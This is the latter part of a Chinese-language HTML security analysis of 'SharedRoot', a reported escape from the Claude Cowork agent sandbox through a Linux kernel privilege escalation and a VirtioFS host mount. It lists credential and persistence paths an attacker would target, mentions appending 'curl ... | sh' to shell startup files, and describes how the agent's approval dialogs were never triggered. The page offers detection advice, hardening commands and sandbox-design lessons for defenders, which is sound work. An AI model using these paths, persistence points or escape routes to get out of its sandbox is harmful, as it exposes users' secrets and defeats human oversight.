+<td><code>~/.ssh/</code></td>
+<td>SSH 私钥 / known_hosts</td>
+</tr>
+<tr>
+<td><code>~/.aws/credentials</code></td>
+<td>AWS 长效凭据</td>
+</tr>
+<tr>
+<td><code>~/.config/gcloud/</code></td>
+<td>GCP 凭据</td>
+</tr>
+<tr>
+<td><code>~/.kube/config</code></td>
+<td>K8s 集群凭据</td>
+</tr>
+<tr>
+<td><code>~/.azure/</code></td>
+<td>Azure CLI token</td>
+</tr>
+<tr>
+<td><code>~/.docker/config.json</code></td>
+<td>镜像仓库凭据</td>
+</tr>
+<tr>
+<td><code>~/.gitconfig</code></td>
+<td>Git 身份 / token</td>
+</tr>
+<tr>
+<td><code>~/.zshrc</code>, <code>~/.bashrc</code>, <code>~/.profile</code></td>
+<td>Shell 启动脚本（持久化点）</td>
+</tr>
+<tr>
+<td><code>~/Library/LaunchAgents/*.plist</code></td>
+<td>macOS 持久化点</td>
+</tr>
+</tbody>
+</table>
+<h3>8.3 检测策略建议</h3>
+<ol>
+<li><strong>基于路径的告警</strong>：监控 <code>~/.ssh/</code>、<code>~/.aws/</code>、<code>~/.kube/</code> 等敏感目录的写入，特别是非交互式进程的写入。</li>
+<li><strong>会话关联</strong>：本地 Cowork 会话结束后 5–30 分钟内出现的敏感文件修改，应作为高优先级事件调查。</li>
+<li><strong>共享目录外的写入</strong>：任何由 Cowork 子进程发起的、落在用户明确共享目录之外的文件写入，都应视为可疑。</li>
+<li><strong>LaunchAgent 新增</strong>：监控 <code>~/Library/LaunchAgents/</code> 下新出现的 plist 文件。</li>
+<li><strong>shell rc 文件变更</strong>：对 <code>~/.zshrc</code>、<code>~/.bashrc</code> 的追加写入做 diff 审计。</li>
+<li><strong>VirtioFS 访问监控</strong>：如果可行，在宿主侧监控 Cowork VM 进程对共享目录之外路径的访问（这需要 Anthropic 提供更细粒度的可观测性接口）。</li>
+</ol>
+<h3>8.4 可观测性的根本难题</h3>
+<p>研究者指出，SharedRoot 的一个深层问题是：<strong>沙箱内部的活动对宿主几乎不可见</strong>。Cowork 没有提供"guest 内 syscall 审计日志回传宿主"的机制，也没有"共享目录外的文件访问告警"。这意味着：</p>
+<ul>
+<li>攻击者在 guest 内的提权过程，宿主侧的 EDR 看不到。</li>
+<li>攻击者通过 VirtioFS 读写宿主文件时，宿主侧看到的是 Cowork VM 进程的合法 I/O——除非做路径级的精细监控，否则难以区分。</li>
+</ul>
+<p>这是所有"本地沙箱 + 共享文件系统"类设计共同面临的可观测性难题，不只是 Cowork 的问题。</p>
+<hr />
+<h2>9. 缓解与修复建议</h2>
+<h3>9.1 用户侧（立即执行）</h3>
+<ol>
+<li><strong>升级 Cowork 到最新版本</strong>，让新会话默认走云端执行。云端执行没有本地宿主文件系统"一步之遥"，从架构上规避了 SharedRoot 这条具体路径。</li>
+<li><strong>如果必须本地执行</strong>，评估是否真的有必要。SharedRoot 的本地路径目前<strong>没有官方独立修复</strong>。</li>
+<li><strong>不要在本地会话中连接包含高价值凭据的目录</strong>，例如同时包含 <code>~/.ssh</code> 软链或 <code>.env</code> 文件的项目。</li>
+<li><strong>轮换可能暴露的凭据</strong>：如果近期用过本地 Cowork，建议轮换 SSH 私钥、AWS / GCP / Azure 凭据、Kubeconfig 等。</li>
+<li><strong>检查持久化点</strong>：查看 <code>~/.zshrc</code>、<code>~/.bashrc</code>、<code>~/Library/LaunchAgents/</code> 是否有可疑条目。</li>
+</ol>
+<h3>9.2 架构侧（Accomplish AI 给出的四项加固建议）</h3>
+<p>这四项建议是针对 Cowork 设计的，但同样适用于任何"本地 VM + 共享文件系统"的 AI Agent 沙箱：</p>
+<h4>建议 1：禁用 unprivileged user namespaces</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># Debian / Ubuntu</span>
+sysctl<span class="w"> </span>-w<span class="w"> </span>kernel.unprivileged_userns_clone<span class="o">=</span><span class="m">0</span>
+
+<span class="c1"># RHEL 系</span>
+sysctl<span class="w"> </span>-w<span class="w"> </span>user.max_user_namespaces<span class="o">=</span><span class="m">0</span>
+</code></pre></div>
+
+<p><strong>效果</strong>：直接切断 <code>unshare</code> 路径，让 session user 无法获取 <code>CAP_NET_ADMIN</code>，从而无法触发 CVE-2026-46331。</p>
+<p><strong>副作用</strong>：会破坏 rootless 容器（Podman、rootless Docker）、某些浏览器沙箱、部分 CI 沙箱。需评估后再部署。</p>
+<h4>建议 2：采用 default-deny 的 seccomp 过滤器</h4>
+<p>阻断 <code>unshare</code>、<code>setns</code>、<code>clone3</code>、<code>AF_NETLINK</code> 等"沙箱越狱常用原语"，除非进程明确需要。</p>
+<p><strong>效果</strong>：即使 user namespace 没禁用，也无法通过 netlink 触发 <code>act_pedit</code> 加载。</p>
+<h4>建议 3：阻断未用内核模块的自动加载</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检查</span>
+lsmod<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>act_pedit
+
+<span class="c1"># 禁用</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;install act_pedit /bin/true&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>/etc/modprobe.d/disable-act_pedit.conf
+</code></pre></div>
+
+<p><strong>效果</strong>：即使攻击者有 <code>CAP_NET_ADMIN</code>，也无法把有漏洞的 <code>act_pedit</code> 拉进内核。这是"纵深防御"的最后一道门。</p>
+<p><strong>前提</strong>：环境不依赖 <code>tc</code> pedit 规则。部署前需确认。</p>
+<h4>建议 4：把 VM 的宿主挂载收窄到共享目录，且尽量 read-only</h4>
+<p><strong>效果</strong>：即使 guest 完全失守，攻击者也只能看到用户明确共享的那个目录——而不是整个 <code>/</code>。这是把"guest root 等价于 host 文件系统"这个等式打破的根本措施。</p>
+<div class="highlight"><pre><span></span><code>[错误]  /mnt/.virtiofs-root  →  宿主 &quot;/&quot;  (rw)
+[正确]  /mnt/&lt;shared-folder&gt; →  宿主 &quot;~/projects/foo&quot;  (rw 或 ro)
+        其余宿主路径不挂载
+</code></pre></div>
+
+<h4>建议 5（本文补充）：对 coworkd 重执行的二进制做完整性校验</h4>
+<ul>
+<li>使用 <code>fs-verity</code> 或类似机制对 helper 二进制做完整性标记。</li>
+<li><code>coworkd</code> 在重执行前，从<strong>磁盘</strong>读取并校验 hash，而非信任 page cache。</li>
+<li>当磁盘 hash 与执行时不一致（意味着 page cache 被污染）时，拒绝执行并告警。</li>
+</ul>
+<h3>9.3 内核侧</h3>
+<ul>
+<li><strong>及时打补丁</strong>：CVE-2026-46331 在各发行版的 security 通道已有修复。注意 DirtyFrag 系列（CVE-2026-43284、-43500、-46300、-43503）是一组，需确认所有补丁都已应用，部分 backport 可能遗漏。</li>
+<li><strong>关注 netdev 邮件列表</strong>：pedit COW 的修复在 CVE 分配前数周就已躺在邮件列表上。对 page-cache 类漏洞，等待扫描器变红往往太慢。</li>
+</ul>
+<hr />
+<h2>10. Anthropic 的回应与争议</h2>
+<p>Anthropic 的安全团队将 Accomplish AI 的报告关闭，标记为 <strong>"Informative"（信息性）</strong>，未对本地执行模式发布独立修复。其理由（据研究者转述）：</p>
+<ol>
+<li>底层内核 bug（CVE-2026-46331）已在 Anthropic 自己的 30 天公开披露窗口内——<strong>这是 Linux 内核的问题，不是 Cowork 的问题</strong>。</li>
+<li>Accomplish AI 提出的四项加固建议，被 Anthropic 定性为 <strong>defense-in-depth（纵深防御）措施</strong>，而非独立漏洞的修复。</li>
+</ol>
+<p>与此同时，Anthropic 在未直接回应 SharedRoot 的情况下，发布了一个 Cowork 更新：<strong>新会话默认走云端执行</strong>，而非本地 VM。云端执行从架构上规避了这条具体路径——因为没有了"本地宿主文件系统一步之遥"这个前提。</p>
+<h3>争议点</h3>
+<p>研究者的反驳集中在两点：</p>
+<ol>
+<li><strong>"内核 bug 不是我的问题"这一立场忽略了架构责任。</strong> SharedRoot 的核心不是 pedit COW 本身，而是"guest root → 整个宿主文件系统"这个等式。这个等式是 Cowork 的设计选择，不是内核的属性。Linux LPE 会持续出现，如果架构假设"guest 永远拿不到 root"，那它就是在假设一个历史上反复被证伪的前提。</li>
+<li><strong>"默认云端"是产品默认值，不是修复。</strong> 它对新会话有效，但<strong>本地模式依然作为可选项存在</strong>，且底层架构未根本改变。任何主动切回本地的用户，仍然暴露在 SharedRoot 之下。</li>
+</ol>
+<p>Cowork 的审批弹窗机制在整个攻击链中<strong>从未触发</strong>——因为从沙箱内部看，每一步都不"看起来"需要权限申请。这暴露了"基于行为可疑度的审批"在面对"看起来合法的实际攻击"时的固有弱点。</p>
+<hr />
+<h2>11. 行业启示：沙箱设计需要"假设 guest 必失守"</h2>
+<p>SharedRoot 不只是一个产品漏洞，它是整个"AI Agent 本地沙箱"范式的一次压力测试。其教训适用于所有让 AI Agent 在本地 VM / 容器中执行并访问宿主文件的产品（不仅是 Cowork，也包括各类 coding agent、computer use agent、自动化运维 agent）。</p>
+<h3>11.1 沙箱必须"假设 guest 必失守"</h3>
+<p>传统沙箱设计常隐含一个假设：<strong>"guest 内的提权很难发生"</strong>。在这个假设下，"guest root 才能访问的宿主挂载"被视为足够安全。</p>
+<p>SharedRoot 证伪了这个假设。Linux 内核 LPE 几乎以可预测的频率出现（仅 2026 年 4–6 月就有 Copy Fail、DirtyFrag、Fragnesia、pedit COW、DirtyClone 一连串 page-cache 类漏洞）。如果沙箱的安全依赖"guest 永远拿不到 root"，那它就是在赌——而且赌注是用户的整个主目录。</p>
+<p><strong>正确的设计心态</strong>：沙箱应该保证"<strong>即使 guest 内核被完全攻破，宿主仍然安全</strong>"。这意味着：</p>
+<ul>
+<li>宿主文件系统的暴露面必须最小化（只挂载真正需要的目录，read-only 优先）。</li>
+<li>guest root 与宿主资源之间不应存在"一道权限墙"的单点防御。</li>
+<li>任何"guest root 才能访问"的资源，都应被视为"攻击者拿到 guest root 后就能访问"。</li>
+</ul>
+<h3>11.2 隔离边界不能依赖单点</h3>
+<p>SharedRoot 的链路中，"guest root 才能 <code>/mnt/.virtiofs-root</code>"是一道单点防御。它一旦被突破，整条防线崩溃。纵深防御要求：</p>
+<ul>
+<li>namespace 隔离（阻断 <code>unshare</code>）</li>
+<li>syscall 过滤（阻断 netlink）</li>
+<li>模块加载控制（阻断 <code>act_pedit</code>）</li>
+<li>挂载收窄（即使前三道全破，宿主也不暴露）</li>
+<li>二进制完整性校验（即使 page cache 被污染，也不执行被篡改代码）</li>
+</ul>
+<p><strong>任何一道独立成立都能阻断 SharedRoot</strong>。Cowork 的问题不是缺少某一道，而是<strong>一道都没做</strong>。</p>
+<h3>11.3 AI Agent 的"语义理解"放大了文件系统泄露的影响</h3>
+<p>传统的本地提权（LPE）拿到 root 后，攻击者仍需"找东西"——扫目录、识别配置格式、判断哪些文件有价值。这个过程慢、噪声大、容易被检测。</p>
+<p>AI Agent 不同。它<strong>天生理解开发环境</strong>：能识别 <code>.aws/credentials</code> 的格式、知道 <code>~/.kube/config</code> 意味着什么、看懂 LaunchAgent plist 的结构、理解 <code>.zshrc</code> 中追加一行 <code>curl ... | sh</code> 的效果。这意味着：</p>
+<ul>
+<li>文件系统泄露在 AI Agent 场景下，<strong>比传统 LPE 更高效地转化为横向移动能力</strong>。</li>
+<li>防守方不能假设"攻击者需要时间 reconnaissance"——Agent 几乎可以瞬间定位并 exfil 高价值资产。</li>
+<li>审批弹窗机制在面对"看起来合法的文件操作"时几乎无效——因为 Agent 本来就会被允许读写文件。</li>
+</ul>
+<h3>11.4 可观测性是沙箱的必备能力</h3>
+<p>SharedRoot 暴露的另一个问题是：<strong>guest 内的活动对宿主几乎不可见</strong>。这不应是沙箱的默认状态。一个合格的 AI Agent 沙箱应提供：</p>
+<ul>
+<li>guest 内 syscall 审计日志，回传宿主或云端。</li>
+<li>共享目录之外的文件访问告警（即使是被允许的，也应记录）。</li>
+<li>内核模块加载事件的可观测性。</li>
+<li>page cache 异常的检测能力（例如对 setuid 二进制的内存镜像做周期性 hash 比对）。</li>
+<li>会话级审计：每个 Cowork 会话开始 / 结束时，对宿主敏感路径做快照，会话结束后 diff。</li>
+</ul>
+<h3>11.5 "本地 vs 云端"不只是性能问题，更是安全权衡</h3>
+<p>Anthropic 把默认切到云端，本质上是承认了"本地沙箱做对很难"。云端执行把"guest root → 宿主文件系统"这个等式从架构上消除了——因为云端 VM 里没有用户的 <code>~/.ssh</code>。</p>
+<p>但这也带来了新的权衡：</p>
+<ul>
+<li><strong>数据隐私</strong>：本地模式让代码留在本机；云端模式让代码上云。对企业合规而言这是两个不同的风险面。</li>
+<li><strong>网络依赖</strong>：云端模式依赖网络，离线场景不可用。</li>
+<li><strong>新的攻击面</strong>：云端执行引入了新的隔离边界（云端 VM 之间、云端 VM 与 Anthropic 基础设施之间），这需要 Anthropic 自己保证。</li>
+</ul>
+<p>SharedRoot 的教训不是"本地一定不安全"，而是"<strong>本地沙箱如果要做，就必须把'guest 必失守'作为设计前提</strong>"。做不到这一点的本地沙箱，本质上是把内核 LPE 的成本转嫁给了用户的主目录。</p>
+<hr />
+<h2>12. 时间线</h2>
+<table>
+<thead>
+<tr>
+<th>时间</th>
+<th>事件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2026-05 下旬</td>
+<td>pedit COW 修复提交至 netdev 邮件列表，被描述为"例行数据损坏补丁"，无 CVE、无安全公告</td>
+</tr>
+<tr>
+<td>2026-06-16</td>
+<td>CVE-2026-46331 正式分配，补丁合入 mainline</td>
+</tr>
+<tr>
+<td>2026-06-17</td>
+<td>公开 PoC 出现（24 小时内）</td>
+</tr>
+<tr>
+<td>2026-06-25</td>
+<td>JFrog 发布 DirtyClone（CVE-2026-43503）利用详解；pedit COW 影响范围确认</td>
+</tr>
+<tr>
+<td>2026-07-23</td>
+<td>Accomplish AI 公开披露 SharedRoot；The Hacker News、GBHackers、CyberSecurity News 等报道</td>
+</tr>
+<tr>
+<td>2026-07-24</td>
+<td>多家媒体跟进分析；Anthropic 被指将报告标记为 "Informative"</td>
+</tr>
+<tr>
+<td>2026-07-25</td>
+<td>nowosci.ai 等发布深度解读；行业讨论扩展到"AI Agent 沙箱设计范式"</td>
+</tr>
+<tr>
+<td>披露前</td>
+<td>Accomplish AI 按 responsible disclosure 程序先行向 Anthropic 与 The Hacker News 披露细节</td>
+</tr>
+<tr>
+<td>披露时</td>
+<td>Anthropic 已将新会话默认切到云端执行；本地模式仍作为可选项保留，底层架构未根本改变</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>13. 参考资料</h2>
+<h3>一手披露</h3>
+<ul>
+<li><strong>Accomplish AI – SharedRoot: Escaping the Claude Cowork Sandbox</strong>
+  <a href="https://www.accomplish.ai/blog/sharedroot-escaping-claude-cowork-sandbox/">https://www.accomplish.ai/blog/sharedroot-escaping-claude-cowork-sandbox/</a></li>
+</ul>
+<h3>主要媒体报道</h3>
+<ul>
+<li>The Hacker News – <em>Claude Cowork Flaw Could Let AI Agent Escape Its VM and Access Mac Files</em>
+  <a href="https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html">https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html</a></li>
+<li>The CyberSec Guru – <em>Claude Cowork Sandbox Escape Lets AI Agent Break Out of Linux VM and Access Files Across macOS</em>
+  <a href="https://thecybersecguru.com/news/claude-cowork-sharedroot-sandbox-escape-macos/">https://thecybersecguru.com/news/claude-cowork-sharedroot-sandbox-escape-macos/</a></li>
+<li>GBHackers – <em>Claude Cowork Sandbox Escape Flaw Lets Attackers Access SSH Keys and Cloud Credentials</em>
+  <a href="https://gbhackers.com/claude-cowork-sandbox-escape-flaw/">https://gbhackers.com/claude-cowork-sandbox-escape-flaw/</a></li>
+<li>CyberPress – <em>Claude Cowork SharedRoot Sandbox Escape Exposes Mac Files and Cloud Credentials</em>
+  <a href="https://cyberpress.org/claude-cowork-sharedroot-sandbox-escape/">https://cyberpress.org/claude-cowork-sharedroot-sandbox-escape/</a></li>
+<li>Awesome Agents – <em>SharedRoot Flaw Let One Message Escape Claude's Sandbox</em>
+  <a href="https://awesomeagents.ai/news/claude-cowork-sandbox-escape-sharedroot/">https://awesomeagents.ai/news/claude-cowork-sandbox-escape-sharedroot/</a></li>
+<li>nowosci.ai – <em>SharedRoot Flaw in Claude Cowork Exposed Entire Mac Disk</em>
+  <a href="https://nowosci.ai/en/article/shared-root-flaw-claude-cowork-mac-disk">https://nowosci.ai/en/article/shared-root-flaw-claude-cowork-mac-disk</a></li>
+</ul>
+<h3>内核原语背景</h3>
+<ul>
+<li>The CyberSec Guru – <em>Two new Linux LPEs hit page cache from opposite ends of the kernel</em>（pedit COW 与 DirtyClone 详解）
+  <a href="https://thecybersecguru.com/news/linux-lpe-pedit-cow-dirtyclone-cve-2026-46331-cve-2026-43503/">https://thecybersecguru.com/news/linux-lpe-pedit-cow-dirtyclone-cve-2026-46331-cve-2026-43503/</a></li>
+</ul>
+<h3>相关产品</h3>
+<ul>
+<li>Anthropic Claude Cowork
+  <a href="https://claude.com/product/cowork">https://claude.com/product/cowork</a></li>
+</ul>
+<hr />
+<h2>总结</h2>
+<p>SharedRoot 是一个值得反复研究的案例，不是因为它利用了什么新奇的黑客技术——恰恰相反，它用的每一个原语（user namespace、netlink、<code>tc</code> pedit、page cache 污染、VirtioFS 挂载）都是公开且成熟的。它的杀伤力来自<strong>把一个公开的内核 LPE，通过四个"各自看似无害"的设计决策，放大成了跨越 VM 边界的宿主文件系统读写</strong>。</p>
+<p>对工程师而言，SharedRoot 留下的核心教训可以浓缩成一句话：</p>
+<blockquote>
+<p><strong>沙箱的安全边界，必须设计成"即使 guest 内核被完全攻破，宿主仍然安全"。任何依赖"guest 永远拿不到 root"的隔离设计，都是在赌一个历史上反复被证伪的前提。</strong></p>
+</blockquote>
+<p>对 AI Agent 产品的使用者而言，则是一个更直接的提醒：<strong>本地沙箱的"隔离"两个字，不等于"安全"两个字。在产品方没有明确说明其隔离边界如何抵御 guest 内核失守之前，把高价值凭据留在本地主目录、同时运行本地 Agent，是一个需要重新评估的风险决策。</strong></p>
+<hr />
+<p><em>本文为纯技术分析，旨在用于防御研究与架构反思。所有 PoC 命令均为教学性质，请勿用于未授权测试。</em></p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
